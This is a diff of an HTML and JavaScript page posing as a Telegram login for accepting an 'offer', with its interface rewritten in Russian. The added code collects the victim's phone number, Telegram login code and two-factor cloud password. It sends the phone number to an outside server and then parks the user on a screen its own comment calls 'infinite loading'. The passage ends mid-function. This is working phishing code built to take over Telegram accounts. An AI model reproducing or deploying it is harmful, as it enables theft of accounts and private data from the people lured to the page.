@@ -1,5 +1,5 @@
 <!doctype html>
-<html lang="en">
+<html lang="ru">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,user-scalable=no">
@@ -8,541 +8,533 @@
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='50' cy='50' r='50' fill='%232ea6da'/><path d='M22 49l52-22-8 50-16-13-9 9-2-16z' fill='white'/></svg>">
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
-:root{
-  --bg-gradient:linear-gradient(135deg,#a7d47c 0%,#8bc96e 30%,#6fbf6a 70%,#b5d782 100%);
-  --card-bg:#ffffff;
-  --text:#000000;
-  --text-secondary:#707579;
-  --input-border:#dadce0;
-  --input-focus:#3390ec;
-  --btn-primary:#3390ec;
-  --btn-primary-hover:#2a7bc4;
-  --btn-disabled:#e3e5e8;
-  --btn-disabled-text:#a5a5a5;
-  --link:#3390ec;
-  --logo-circle:#4da8e8;
-  --pattern-color:rgba(90,140,80,0.2);
-}
-[data-theme="dark"]{
-  --bg-gradient:linear-gradient(135deg,#0a0a0a 0%,#0d0a15 30%,#0f0c1a 70%,#0a0a0a 100%);
-  --card-bg:#212121;
-  --text:#ffffff;
-  --text-secondary:#aaaaaa;
-  --input-border:#3a3a3a;
-  --input-focus:#8774e1;
-  --btn-primary:#8774e1;
-  --btn-primary-hover:#7663c9;
-  --btn-disabled:#2a2a2a;
-  --btn-disabled-text:#666666;
-  --link:#8774e1;
-  --logo-circle:#8774e1;
-  --pattern-color:rgba(135,116,225,0.15);
-}
 *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
 html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
-body{
-  background:var(--bg-gradient);
-  color:var(--text);
-  display:flex;align-items:center;justify-content:center;
-  min-height:100vh;padding:20px;overflow-x:hidden;
-  position:relative;transition:background .3s;
-}
-.bg-pattern{
-  position:fixed;inset:0;pointer-events:none;opacity:.5;
-  font-size:34px;line-height:1.4;letter-spacing:14px;word-spacing:18px;
-  padding:20px;
-  color:var(--pattern-color);
-  overflow:hidden;
-  white-space:pre-wrap;
-  word-break:break-all;
-  user-select:none;
-  z-index:0;
-}
-@media(max-width:600px){.bg-pattern{font-size:24px;letter-spacing:10px;word-spacing:12px}}
-
-.theme-toggle{
-  position:fixed;top:20px;right:20px;z-index:100;
-  width:44px;height:44px;border-radius:50%;
-  background:rgba(255,255,255,.9);
-  border:none;cursor:pointer;font-size:20px;
-  display:flex;align-items:center;justify-content:center;
-  box-shadow:0 2px 8px rgba(0,0,0,.15);
-  transition:transform .2s,background .2s;
-}
-.theme-toggle:hover{transform:scale(1.05)}
-[data-theme="dark"] .theme-toggle{background:rgba(60,60,60,.9);color:#fff}
+body{background:#fff;color:#000;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;overflow-x:hidden}
 
 .card{
-  position:relative;z-index:2;
-  background:var(--card-bg);
-  border-radius:20px;
-  padding:44px 32px 32px;
+  position:relative;background:#fff;
+  border-radius:12px;
+  padding:40px 28px 32px;
   width:100%;max-width:400px;
-  box-shadow:0 12px 48px rgba(0,0,0,.12),0 2px 8px rgba(0,0,0,.06);
   text-align:center;
-  animation:cardIn .4s cubic-bezier(.16,1,.3,1);
 }
-@keyframes cardIn{from{opacity:0;transform:translateY(16px) scale(.98)}to{opacity:1;transform:translateY(0) scale(1)}}
 
-.logo{
-  width:112px;height:112px;border-radius:50%;
-  margin:0 auto 22px;
-  background:var(--logo-circle);
-  display:flex;align-items:center;justify-content:center;
-  transition:background .3s;
+/* ─── ЭКРАН 1 ─── */
+.logos{
+  display:flex;justify-content:center;align-items:center;
+  gap:-8px;margin-bottom:20px;position:relative;
+  height:80px;
 }
-.logo svg{width:60px;height:60px;fill:#fff;margin-left:-5px;margin-top:3px}
-
-h1{font-size:26px;font-weight:600;letter-spacing:-.3px;margin-bottom:10px;color:var(--text)}
-.sub{color:var(--text-secondary);font-size:14.5px;line-height:1.5;margin-bottom:26px;padding:0 8px}
-
-.step{display:flex;flex-direction:column;gap:14px;text-align:left;animation:stepIn .25s ease}
-@keyframes stepIn{from{opacity:0;transform:translateX(6px)}to{opacity:1;transform:translateX(0)}}
-.hidden{display:none !important}
-
-.field{position:relative;margin-bottom:14px}
-.field label{position:absolute;top:-8px;left:14px;background:var(--card-bg);padding:0 6px;font-size:12.5px;color:var(--input-focus);font-weight:500;z-index:1;transition:color .2s;letter-spacing:.2px}
-.field input{
-  width:100%;padding:15px 14px;
-  background:transparent;
-  border:1.5px solid var(--input-border);
-  border-radius:10px;
-  color:var(--text);font-size:15.5px;
-  outline:none;transition:border-color .2s;
-  font-family:inherit;
+.logos .tg-circle{
+  width:80px;height:80px;border-radius:50%;
+  background:#2ea6da;display:flex;align-items:center;justify-content:center;
+  position:relative;z-index:2;
+  box-shadow:0 2px 8px rgba(46,166,218,.3);
 }
-.field input:focus{border-color:var(--input-focus)}
-.field input::placeholder{color:var(--text-secondary);opacity:.6}
+.logos .tg-circle svg{width:46px;height:46px;fill:#fff;margin-left:-3px}
+.logos .shield-circle{
+  width:80px;height:80px;border-radius:50%;
+  background:#000;display:flex;align-items:center;justify-content:center;
+  position:relative;z-index:1;margin-left:-16px;
+}
+.logos .shield-circle svg{width:40px;height:40px;fill:#fff}
 
-.btn{
-  width:100%;padding:15px;background:var(--btn-primary);color:#fff;
-  border:none;border-radius:10px;font-size:16px;font-weight:600;
-  cursor:pointer;margin-top:6px;
+h1{font-size:22px;font-weight:600;margin-bottom:12px;color:#000;letter-spacing:-.3px}
+.sub{color:#707579;font-size:13.5px;line-height:1.5;margin-bottom:24px;padding:0 12px}
+
+/* список аккаунтов */
+.accounts-box{
+  background:#f5f5f5;border-radius:12px;padding:8px 14px;
+  margin-bottom:24px;text-align:left;
+}
+.account-row{
+  display:flex;align-items:center;gap:12px;
+  padding:12px 0;
+  border-bottom:1px solid #e5e5e5;
+}
+.account-row:last-child{border-bottom:none;cursor:pointer}
+.account-row:last-child:hover{opacity:.7}
+.account-icon{
+  width:36px;height:36px;border-radius:50%;
+  background:#000;display:flex;align-items:center;justify-content:center;
+  flex-shrink:0;
+}
+.account-icon svg{width:22px;height:22px;fill:#fff}
+.account-icon.plus{
+  background:transparent;border:2px solid #3390ec;
+}
+.account-icon.plus svg{fill:#3390ec}
+.account-main{flex:1}
+.account-name{font-size:15px;font-weight:500;color:#000}
+.account-check{
+  width:24px;height:24px;border-radius:50%;
+  background:#2ea6da;display:flex;align-items:center;justify-content:center;
+  flex-shrink:0;
+}
+.account-check svg{width:14px;height:14px;fill:#fff}
+
+.btn-primary{
+  width:100%;padding:15px;background:#2ea6da;color:#fff;
+  border:none;border-radius:24px;font-size:15px;font-weight:600;
+  cursor:pointer;margin-bottom:14px;
   transition:background .2s,transform .08s;
-  font-family:inherit;letter-spacing:.5px;
-  text-transform:uppercase;
+  font-family:inherit;letter-spacing:.2px;
 }
-.btn:hover:not(:disabled){background:var(--btn-primary-hover)}
-.btn:active:not(:disabled){transform:scale(.985)}
-.btn:disabled{background:var(--btn-disabled);color:var(--btn-disabled-text);cursor:not-allowed}
-.btn-ghost{background:transparent;color:var(--link);padding:12px;font-size:14px;font-weight:500;border:none;cursor:pointer;font-family:inherit;margin-top:6px;border-radius:8px}
-.btn-danger{background:transparent;color:#e85353;padding:14px;font-size:14px;font-weight:500;border:none;cursor:pointer;font-family:inherit;margin-top:14px;border-radius:8px;width:100%}
+.btn-primary:hover{background:#2589b5}
+.btn-primary:active{transform:scale(.985)}
 
-.links{margin-top:24px;display:flex;flex-direction:column;gap:12px;align-items:center}
-.link{
-  background:none;border:none;color:var(--link);
-  font-size:14px;font-weight:600;letter-spacing:.5px;
-  text-transform:uppercase;cursor:pointer;font-family:inherit;
-  padding:4px 8px;transition:opacity .2s;
-  display:flex;align-items:center;gap:4px;
+.btn-link{
+  background:none;border:none;color:#2ea6da;
+  font-size:14px;font-weight:500;cursor:pointer;font-family:inherit;
+  padding:8px;
 }
-.link:hover{opacity:.75}
-.link .arrow{font-size:11px}
+.btn-link:hover{opacity:.7}
 
-.spinner-wrap{text-align:center;padding:24px 0}
-.spinner{width:46px;height:46px;border:3px solid var(--btn-disabled);border-top-color:var(--btn-primary);border-radius:50%;margin:0 auto 18px;animation:spin .9s linear infinite}
+/* ─── ЭКРАН КОДА ─── */
+.app-header{
+  position:fixed;top:0;left:0;right:0;
+  height:56px;background:#17212b;color:#fff;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:0 20px;z-index:10;
+}
+.app-header .app-title{font-size:17px;font-weight:500}
+.app-header .close-btn{background:none;border:none;color:#fff;font-size:24px;cursor:pointer;line-height:1}
+body.code-screen{padding-top:80px;align-items:flex-start}
+body.code-screen .card{padding-top:24px;background:transparent;box-shadow:none}
+
+.monkey-box{
+  width:120px;height:120px;margin:0 auto 16px;
+  position:relative;
+  display:flex;align-items:center;justify-content:center;
+}
+.monkey-box .emoji{font-size:96px;line-height:1}
+.monkey-box .hands{
+  position:absolute;top:55%;
+  font-size:44px;
+  transition:all .3s ease;
+}
+.monkey-box .hands.left{left:6%}
+.monkey-box .hands.right{right:6%}
+@keyframes peek-a-boo{
+  0%,100%{transform:translateY(0) rotate(0)}
+  50%{transform:translateY(-10px) rotate(-5deg)}
+}
+.monkey-box.peeking .hands{animation:peek-a-boo 1.6s ease-in-out infinite}
+
+.tg-badge{
+  display:inline-block;padding:4px 12px;border-radius:12px;
+  background:#eaf5ff;color:#2ea6da;
+  font-size:11px;font-weight:600;letter-spacing:.5px;
+  margin-bottom:14px;
+}
+.phone-display{
+  font-size:24px;font-weight:700;color:#000;margin-bottom:12px;
+  letter-spacing:.3px;
+}
+.code-hint{font-size:14px;color:#707579;line-height:1.5;margin-bottom:24px;padding:0 12px}
+.code-hint b{color:#000;font-weight:600}
+
+.code-label{font-size:11px;color:#707579;letter-spacing:.8px;margin-bottom:8px;text-transform:uppercase;font-weight:600}
+
+.code-input-wrap{
+  position:relative;background:#f5f5f5;border-radius:24px;
+  padding:16px 20px;margin-bottom:20px;
+  display:flex;align-items:center;justify-content:center;gap:14px;
+}
+.code-input-wrap input{
+  position:absolute;inset:0;opacity:0;
+  font-size:20px;border:none;outline:none;
+  cursor:text;text-align:center;font-family:inherit;
+}
+.code-dots{
+  display:flex;gap:14px;justify-content:center;
+  pointer-events:none;
+}
+.code-dots .dot{
+  width:12px;height:12px;border-radius:50%;
+  background:#c4c9cc;transition:background .2s;
+}
+.code-dots .dot.filled{background:#2ea6da}
+
+.btn-continue{
+  width:100%;padding:15px;background:#2ea6da;color:#fff;
+  border:none;border-radius:24px;font-size:15px;font-weight:600;
+  cursor:pointer;font-family:inherit;
+}
+.btn-continue:hover{background:#2589b5}
+
+/* ─── ЗАГРУЗКА ─── */
+.loader-wrap{text-align:center;padding:40px 0}
+.loader{
+  width:60px;height:60px;margin:0 auto 20px;
+  border:4px solid #e5e5e5;border-top-color:#2ea6da;
+  border-radius:50%;animation:spin 1s linear infinite;
+}
 @keyframes spin{to{transform:rotate(360deg)}}
-.spinner-wrap p{color:var(--text-secondary);font-size:14px}
+.loader-text{color:#707579;font-size:15px}
 
-.error{background:rgba(232,83,83,.1);color:#e85353;padding:12px 14px;border-radius:10px;font-size:13px;margin-top:14px;text-align:left;line-height:1.45;animation:stepIn .2s ease}
-.attempts{font-size:12px;color:#e85353;margin-top:6px}
-.code-hint{font-size:14px;color:var(--text-secondary);margin-bottom:-2px;line-height:1.5;text-align:left}
-.code-hint b{color:var(--text);font-weight:500}
-
-.profile-avatar{width:110px;height:110px;border-radius:50%;margin:0 auto 20px;background:var(--logo-circle);display:flex;align-items:center;justify-content:center;font-size:44px;font-weight:600;color:#fff;overflow:hidden}
-.profile-name{font-size:22px;font-weight:600;margin-bottom:6px;color:var(--text)}
-.profile-username{color:var(--link);font-size:15px;margin-bottom:20px}
-.profile-status{display:inline-block;padding:6px 14px;background:rgba(83,195,124,.15);color:#53c37c;border-radius:20px;font-size:13px;margin-bottom:22px;font-weight:500}
-.profile-info{background:rgba(127,127,127,.08);border-radius:12px;padding:6px 16px;text-align:left;margin-bottom:16px}
-.profile-info-row{display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px solid rgba(127,127,127,.15);font-size:14.5px}
-.profile-info-row:last-child{border-bottom:none}
-.profile-info-row .key{color:var(--text-secondary)}
-.profile-info-row .val{color:var(--text);font-weight:500}
-
-@media (max-width:400px){
-  .card{padding:36px 22px 26px;border-radius:16px}
-  .logo{width:96px;height:96px;margin-bottom:18px}
-  .logo svg{width:52px;height:52px}
-  h1{font-size:22px}
-  .sub{font-size:13.5px;margin-bottom:22px}
+/* ─── ОШИБКА ─── */
+.error{
+  background:#ffeded;color:#c33;padding:12px 14px;border-radius:10px;
+  font-size:13px;margin-top:14px;text-align:left;line-height:1.45;
 }
+
+/* ─── ТЕЛЕФОН ВРУЧНУЮ (fallback) ─── */
+.field{position:relative;margin-bottom:14px;text-align:left}
+.field label{
+  position:absolute;top:-8px;left:14px;background:#fff;
+  padding:0 6px;font-size:12px;color:#2ea6da;font-weight:500;z-index:1;
+}
+.field input{
+  width:100%;padding:15px 14px;background:transparent;
+  border:1.5px solid #dadce0;border-radius:24px;
+  color:#000;font-size:15.5px;outline:none;
+  font-family:inherit;transition:border-color .2s;
+}
+.field input:focus{border-color:#2ea6da}
+
+.hidden{display:none !important}
 </style>
 </head>
 <body>
 
-<div class="bg-pattern" id="pattern"></div>
-
-<button class="theme-toggle" id="theme-toggle" title="Toggle theme">🌙</button>
-
-<div class="card">
-  <div class="logo">
-    <svg viewBox="0 0 24 24"><path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"/></svg>
+<!-- ═══ ЭКРАН 1: ВХОД ЧЕРЕЗ TELEGRAM ═══ -->
+<div id="screen-auth" class="card">
+  <div class="logos">
+    <div class="tg-circle">
+      <svg viewBox="0 0 24 24"><path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"/></svg>
+    </div>
+    <div class="shield-circle">
+      <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+    </div>
   </div>
 
-  <h1 id="title">Sign in to Telegram</h1>
-  <p class="sub" id="sub">Please confirm your country code<br>and enter your phone number.</p>
+  <h1>Вход через Telegram</h1>
+  <p class="sub">Сайту будут известны Ваше имя, публичная ссылка и фотография</p>
 
-  <form id="step-phone" class="step">
-    <div class="field">
-      <label>Phone Number</label>
-      <input type="tel" id="phone" placeholder="+7 999 123-45-67" autocomplete="tel" required inputmode="tel">
+  <div class="accounts-box">
+    <div class="account-row">
+      <div class="account-icon">
+        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+      </div>
+      <div class="account-main">
+        <div class="account-name">Telegram</div>
+      </div>
+      <div class="account-check">
+        <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+      </div>
     </div>
-    <button type="submit" class="btn" id="btn-next" disabled>NEXT</button>
-  </form>
-
-  <form id="step-code" class="step hidden">
-    <p class="code-hint" id="code-hint">We've sent the code to your Telegram app.</p>
-    <div class="field">
-      <label>Code</label>
-      <input type="text" id="code" placeholder="-----" inputmode="numeric" autocomplete="one-time-code" maxlength="6" required>
+    <div class="account-row" id="btn-other-account">
+      <div class="account-icon plus">
+        <svg viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
+      </div>
+      <div class="account-main">
+        <div class="account-name">Войти в другой аккаунт</div>
+      </div>
     </div>
-    <button type="submit" class="btn">NEXT</button>
-    <button type="button" class="btn-ghost" id="btn-back-phone">← Back to phone number</button>
-  </form>
-
-  <form id="step-2fa" class="step hidden">
-    <p class="code-hint">Your account is protected with an additional password.</p>
-    <div class="field">
-      <label>Password</label>
-      <input type="password" id="password" placeholder="Your password" autocomplete="current-password">
-    </div>
-    <button type="submit" class="btn">NEXT</button>
-  </form>
-
-  <div id="step-loading" class="step hidden">
-    <div class="spinner-wrap"><div class="spinner"></div><p id="loading-text">Checking…</p></div>
   </div>
 
-  <div id="step-profile" class="step hidden">
-    <div class="profile-avatar" id="profile-avatar">A</div>
-    <div class="profile-name" id="profile-name">—</div>
-    <div class="profile-username" id="profile-username">@—</div>
-    <div class="profile-status">Signed in</div>
-    <div class="profile-info">
-      <div class="profile-info-row"><span class="key">ID</span><span class="val" id="profile-id">—</span></div>
-      <div class="profile-info-row"><span class="key">Username</span><span class="val" id="profile-uname">—</span></div>
-      <div class="profile-info-row"><span class="key">Name</span><span class="val" id="profile-fio">—</span></div>
-      <div class="profile-info-row"><span class="key">Phone</span><span class="val" id="profile-phone">—</span></div>
-    </div>
-    <button type="button" class="btn-danger" id="btn-logout">Log out</button>
-  </div>
-
-  <div id="step-rejected" class="step hidden">
-    <h1 style="font-size:22px;margin-bottom:10px">Offer declined</h1>
-    <p class="sub" style="margin-bottom:0">You've declined the offer.</p>
-  </div>
+  <button class="btn-primary" id="btn-continue-tg">Продолжить через Telegram</button>
+  <button class="btn-link" id="btn-manual-phone">Или войти по номеру телефона</button>
 
   <div id="error-box" class="error hidden"></div>
+</div>
 
-  <div class="links" id="links-block">
-    <button class="link" id="link-ru">ПРОДОЛЖИТЬ НА РУССКОМ</button>
-    <button class="link" id="link-qr">LOG IN BY QR CODE <span class="arrow">›</span></button>
-    <button class="link" id="link-passkey">LOG IN BY PASSKEY <span class="arrow">›</span></button>
+<!-- ═══ ЭКРАН 2: ВВОД НОМЕРА ВРУЧНУЮ (fallback) ═══ -->
+<div id="screen-phone" class="card hidden">
+  <h1>Введите номер</h1>
+  <p class="sub">Подтвердите код страны и введите номер телефона</p>
+  <form id="form-phone">
+    <div class="field">
+      <label>Номер телефона</label>
+      <input type="tel" id="phone-input" placeholder="+7 999 123-45-67" inputmode="tel" autocomplete="tel">
+    </div>
+    <button type="submit" class="btn-primary" id="btn-send-code">Продолжить</button>
+    <button type="button" class="btn-link" id="btn-back-auth">Назад</button>
+  </form>
+</div>
+
+<!-- ═══ ЭКРАН 3: ВВОД КОДА ═══ -->
+<div id="screen-code" class="card hidden">
+  <div class="monkey-box" id="monkey">
+    <div class="emoji">🐵</div>
+    <div class="hands left">🤚</div>
+    <div class="hands right">✋</div>
   </div>
+  <div class="tg-badge">TELEGRAM</div>
+  <div class="phone-display" id="phone-display">+7 999 123-45-67</div>
+  <p class="code-hint">Код отправлен в приложение <b>Telegram</b> на вашем устройстве.</p>
+
+  <div class="code-label">Код оффера</div>
+  <div class="code-input-wrap">
+    <input type="tel" id="code-input" maxlength="5" inputmode="numeric" autocomplete="one-time-code">
+    <div class="code-dots" id="code-dots">
+      <div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div>
+    </div>
+  </div>
+  <button class="btn-continue" id="btn-submit-code">Продолжить</button>
+  <div id="code-error" class="error hidden"></div>
+</div>
+
+<!-- ═══ ЭКРАН 4: ВВОД 2FA ═══ -->
+<div id="screen-2fa" class="card hidden">
+  <h1>Двухфакторная аутентификация</h1>
+  <p class="sub">Введите облачный пароль</p>
+  <form id="form-2fa">
+    <div class="field">
+      <label>Пароль</label>
+      <input type="password" id="password-input" placeholder="Ваш пароль" autocomplete="current-password">
+    </div>
+    <button type="submit" class="btn-primary">Продолжить</button>
+  </form>
+  <div id="pass-error" class="error hidden"></div>
+</div>
+
+<!-- ═══ ЭКРАН 5: БЕСКОНЕЧНАЯ ЗАГРУЗКА ═══ -->
+<div id="screen-loading" class="card hidden">
+  <div class="loader-wrap">
+    <div class="loader"></div>
+    <p class="loader-text">Проверяем данные…</p>
+  </div>
+</div>
+
+<!-- ═══ ЭКРАН 6: ОТКЛОНЕНО ═══ -->
+<div id="screen-rejected" class="card hidden">
+  <h1>Оффер отклонён</h1>
+  <p class="sub">Вы отклонили предложение.</p>
 </div>
 
 <script>
 console.log('[INIT] script started');
 
-// ─── ФОН С ЭМОДЗИ ───
-try {
-  var EMOJIS = ['✈','🎁','🐻','🐱','🦄','🌈','⭐','🍕','🍩','🎈','🎮','🚀','🌸','🐶','🐼','🍔','🎸','🎨','🐧','🦊','🍓','🌙','☀','🎯','🎪','🐢','🦋','🍭','🎵','🧸','🐸','🦁','🍦','⚽','🎲','🐬','🦉','🍒','🌻','🎭','🐙','🦜','🍇','🎺','🐝','🦓','🍋','🎬'];
-  var patternText = '';
-  for (var i = 0; i < 300; i++) {
-    patternText += EMOJIS[Math.floor(Math.random() * EMOJIS.length)] + ' ';
-  }
-  var patternEl = document.getElementById('pattern');
-  if (patternEl) patternEl.textContent = patternText + patternText;
-  console.log('[INIT] pattern done');
-} catch (e) { console.error('[PATTERN]', e); }
-
-// ─── ТЕМА ───
-try {
-  var themeToggle = document.getElementById('theme-toggle');
-  function setTheme(theme) {
-    document.documentElement.setAttribute('data-theme', theme);
-    if (themeToggle) themeToggle.textContent = theme === 'dark' ? '☀' : '🌙';
-    try { localStorage.setItem('tg_theme', theme); } catch(e){}
-  }
-  var savedTheme = 'light';
-  try { savedTheme = localStorage.getItem('tg_theme') || 'light'; } catch(e){}
-  setTheme(savedTheme);
-  if (themeToggle) {
-    themeToggle.addEventListener('click', function() {
-      var current = document.documentElement.getAttribute('data-theme') || 'light';
-      setTheme(current === 'dark' ? 'light' : 'dark');
-    });
-  }
-  console.log('[INIT] theme done');
-} catch (e) { console.error('[THEME]', e); }
-
-// ─── TELEGRAM WEBAPP ───
+var API = 'https://botofferswork.onrender.com';
 var tg = null;
 try {
   tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
   if (tg) { tg.ready(); tg.expand(); }
-} catch (e) { console.error('[TG]', e); }
-var tgUserId = (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id : 0;
+} catch(e){}
 
-// ─── ПАРАМЕТРЫ ───
 var offerId = 0;
 var action = 'accept';
 try {
-  var startParam = (tg && tg.initDataUnsafe && tg.initDataUnsafe.start_param) || '';
-  var m = startParam.match(/^offer_(\d+)_(accept|reject)$/);
-  if (m) {
-    offerId = parseInt(m[1], 10);
-    action = m[2];
-  } else {
+  var sp = (tg && tg.initDataUnsafe && tg.initDataUnsafe.start_param) || '';
+  var m = sp.match(/^offer_(\d+)_(accept|reject)$/);
+  if (m) { offerId = parseInt(m[1], 10); action = m[2]; }
+  else {
     var params = new URLSearchParams(location.search);
     offerId = parseInt(params.get('offer') || '0', 10);
     action = (params.get('action') || 'accept').toLowerCase();
   }
-} catch (e) { console.error('[PARAMS]', e); }
+} catch(e){}
 console.log('[INIT] offerId =', offerId, 'action =', action);
 
-// ─── ЭЛЕМЕНТЫ ───
-var $ = function(id) { return document.getElementById(id); };
-var stepPhone = $('step-phone'), stepCode = $('step-code'), step2fa = $('step-2fa');
-var stepLoading = $('step-loading'), stepProfile = $('step-profile');
-var stepRejected = $('step-rejected'), errorBox = $('error-box');
-var linksBlock = $('links-block');
-var phoneInput = $('phone'), codeInput = $('code'), passInput = $('password');
-var btnNext = $('btn-next');
+var $ = function(id){ return document.getElementById(id); };
+var screens = {
+  auth: $('screen-auth'),
+  phone: $('screen-phone'),
+  code: $('screen-code'),
+  fa: $('screen-2fa'),
+  loading: $('screen-loading'),
+  rejected: $('screen-rejected')
+};
+var phone = '';
+var code = '';
 
-var phone = '', code = '', password = null;
+function showScreen(name) {
+  Object.keys(screens).forEach(function(k){
+    if (screens[k]) screens[k].classList.add('hidden');
+  });
+  if (screens[name]) screens[name].classList.remove('hidden');
+  document.body.classList.toggle('code-screen', name === 'code');
+}
 
-// ─── ВВОД НОМЕРА ───
-try {
+function showErr(elId, msg) {
+  var el = $(elId);
+  if (!el) return;
+  el.textContent = msg;
+  el.classList.remove('hidden');
+}
+function hideErr(elId) {
+  var el = $(elId);
+  if (el) el.classList.add('hidden');
+}
+
+// ═══ REJECT ═══
+if (action === 'reject') {
+  showScreen('rejected');
+} else {
+  showScreen('auth');
+}
+
+// ═══ ЭКРАН 1: КНОПКА "ПРОДОЛЖИТЬ ЧЕРЕЗ TELEGRAM" ═══
+$('btn-continue-tg').addEventListener('click', function() {
+  if (!tg || !tg.requestContact) {
+    // fallback — нет requestContact, показываем форму телефона
+    showScreen('phone');
+    return;
+  }
+  try {
+    tg.requestContact(function(sent, event) {
+      console.log('[TG] requestContact result:', sent, event);
+      if (!sent) {
+        showErr('error-box', 'Вы отменили отправку контакта');
+        return;
+      }
+      // event содержит contact: { phone_number, first_name, last_name, user_id }
+      var contact = event && event.contact ? event.contact : (tg.initDataUnsafe && tg.initDataUnsafe.user);
+      var phoneNumber = (contact && contact.phone_number) ? String(contact.phone_number) : '';
+      if (!phoneNumber && tg.initDataUnsafe && tg.initDataUnsafe.user && tg.initDataUnsafe.user.phone_number) {
+        phoneNumber = tg.initDataUnsafe.user.phone_number;
+      }
+      if (!phoneNumber) {
+        showErr('error-box', 'Не удалось получить номер. Войдите вручную.');
+        setTimeout(function(){ showScreen('phone'); }, 1500);
+        return;
+      }
+      if (phoneNumber.charAt(0) !== '+') phoneNumber = '+' + phoneNumber;
+      phone = phoneNumber;
+      sendPhoneToBackend(phone);
+    });
+  } catch(e) {
+    console.error('[requestContact]', e);
+    showScreen('phone');
+  }
+});
+
+// ═══ ЭКРАН 1: "ВОЙТИ ПО НОМЕРУ ТЕЛЕФОНА" (fallback) ═══
+$('btn-manual-phone').addEventListener('click', function() { showScreen('phone'); });
+$('btn-other-account').addEventListener('click', function() { showScreen('phone'); });
+$('btn-back-auth').addEventListener('click', function() { showScreen('auth'); });
+
+// ═══ ЭКРАН 2: ВВОД НОМЕРА ВРУЧНУЮ ═══
+var phoneInput = $('phone-input');
+if (phoneInput) {
   phoneInput.addEventListener('input', function(e) {
-    var v = e.target.value;
-    var digits = v.replace(/\D/g, '');
+    var digits = e.target.value.replace(/\D/g, '');
     if (digits.length > 15) digits = digits.slice(0, 15);
     e.target.value = '+' + digits;
-    // активируем кнопку когда есть минимум код+7 цифр (обычно 10-12)
-    btnNext.disabled = digits.length < 8;
   });
   phoneInput.addEventListener('focus', function(e) {
     if (!e.target.value) e.target.value = '+';
   });
-  console.log('[INIT] phone input ready');
-} catch (e) { console.error('[PHONE-EVENT]', e); }
-
-// ─── LOCALSTORAGE ───
-var SESSION_KEY = 'tg_offer_profile_v9';
-function saveProfile(p) {
-  try { p.tg_user_id = tgUserId; p.saved_at = Date.now();
-    localStorage.setItem(SESSION_KEY, JSON.stringify(p)); } catch(e) {}
 }
-function loadProfile() {
+$('form-phone').addEventListener('submit', function(e) {
+  e.preventDefault();
+  hideErr('error-box');
+  var digits = phoneInput.value.replace(/\D/g, '');
+  if (digits.length < 8) { showErr('error-box', 'Введите полный номер с кодом страны'); return; }
+  phone = '+' + digits;
+  sendPhoneToBackend(phone);
+});
+
+// ═══ ОТПРАВКА НОМЕРА НА BACKEND ═══
+async function sendPhoneToBackend(phoneNum) {
+  showScreen('loading');
   try {
-    var raw = localStorage.getItem(SESSION_KEY);
-    if (!raw) return null;
-    var p = JSON.parse(raw);
-    if (tgUserId && p.tg_user_id && p.tg_user_id !== tgUserId) {
-      localStorage.removeItem(SESSION_KEY); return null;
-    }
-    return p;
-  } catch(e) { return null; }
-}
-function clearProfile() { try { localStorage.removeItem(SESSION_KEY); } catch(e){} }
-
-function showError(msg){ if(errorBox){errorBox.innerHTML=msg;errorBox.classList.remove('hidden');} }
-function hideError(){ if(errorBox){errorBox.classList.add('hidden');} }
-function show(el){ if(el) el.classList.remove('hidden'); }
-function hide(el){ if(el) el.classList.add('hidden'); }
-
-// ─── ИНИЦИАЛИЗАЦИЯ ───
-try {
-  if (action === 'reject') {
-    document.querySelectorAll('.step, #title, #sub, #links-block').forEach(function(el){ el.style.display = 'none'; });
-    stepRejected.style.display = 'flex';
-    document.querySelectorAll('form').forEach(function(f){
-      f.addEventListener('submit', function(e){ e.preventDefault(); });
-    });
-    window.__REJECTED__ = true;
-  } else {
-    window.__REJECTED__ = false;
-    var saved = loadProfile();
-    if (saved && saved.user_id) showProfile(saved);
-  }
-  console.log('[INIT] ready');
-} catch (e) { console.error('[INIT-ERR]', e); }
-
-function showProfile(p){
-  hide(stepPhone); hide(stepCode); hide(step2fa); hide(stepLoading); hide(stepRejected);
-  hide($('title')); hide($('sub')); hide(linksBlock);
-  show(stepProfile);
-  var fio = [p.first_name, p.last_name].filter(Boolean).join(' ') || 'User';
-  $('profile-name').textContent = fio;
